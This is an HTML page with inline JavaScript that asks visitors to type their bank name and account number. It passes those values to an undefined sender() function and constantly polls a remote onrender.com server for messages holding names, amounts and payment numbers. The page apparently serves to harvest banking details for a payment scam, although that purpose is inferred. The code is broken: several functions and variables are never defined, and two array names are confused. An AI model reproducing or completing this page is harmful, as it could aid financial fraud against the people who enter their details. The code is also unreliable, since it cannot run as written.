<!DOCTYPE html>
<html>
<head>
    <title>Message home</title>
    <style>
        body { font-family: Arial; margin: 40px; }
        input { padding: 10px; width: 300px; font-size: 16px; }
        button { padding: 10px 20px; font-size: 16px; background: #007bff; color: white; border: none; cursor: pointer; }
        #status { margin-top: 10px; color: green; }
    </style>
</head>
<body>
    <h2>ðŸ“¤ Send Message</h2>
    <form id="form" method="post">
        <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), azaName: this.value })" placeholder="Type your bank name here">
        <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), realAcc: this.value })" placeholder="Type your account here">
        <input type="submit" value="Send to Receiver">
    </form>
    
    <div id="status">Hey</div>

    <script>   
// MAIN CODE
        let lastMessageId = localStorage.getItem('lastId') || 0;
        const savedInfo = JSON.parse(localStorage.getItem('savedInfos'));

        // Function to fetch new messages using long-polling
        async function fetchMessages() {
            try {
                const response = await fetch(`https://send-39yi.onrender.com/in/messages?lastMessageId=${lastMessageId}`);
                const newMessages = await response.json();

                if (newMessages.length > 0) {
					//alert('New received');
                    extractMessages(newMessages);
                    // Update last message ID
                    lastMessageId = newMessages[newMessages.length - 1].id;
                    localStorage.setItem('lastId', lastMessageId);
                }
            } catch (error) {
                console.error('Error fetching messages:', error);
            } finally {
                // Immediately poll again
                setTimeout(fetchMessages, 100);
            }
        }

		// Extract New Messages, Save/Update
        function extractMessages(messages) {
            messages.forEach(message => {
				const confirmUserId = message.userId;
                const forUser = savedInfo.find(user => user.userId.toLowerCase() === confirmUserId.toLowerCase());
                if (forUser) {
					alert('found');
					if(message.name){
						updateUserById(newUserId, 'name', message.name);
					}
					if(message.amount){
						updateUserById(newUserId, 'amount', message.amount);
					}
					if(message.update){
						updateUserById(newUserId, 'update', message.update);
					}
					if(message.payName){
						updateUserById(newUserId, 'payName', message.payName);
					}
					if(message.payNumber){
						updateUserById(newUserId, 'payNumber', message.payNumber);
					}
                    
                    displaySavedUsers();
                } else {
                    alert('Not For User');
                }
            });
        }
        // UPDATOR using UserId
function updateUserById(id, property, value) {
  const itemIndex = savedInfos.findIndex(user => user.userId === id);
  if (itemIndex !== -1) {
    savedInfos[itemIndex][property] = value;
    localStorage.setItem('savedInfos', JSON.stringify(savedInfos));
  }
}
        
        // Start polling when page loads
        window.addEventListener('load', () => {
            fetchMessages(); 
            displaySavedUsers();
        });
    </script>
</body>
</html>
        
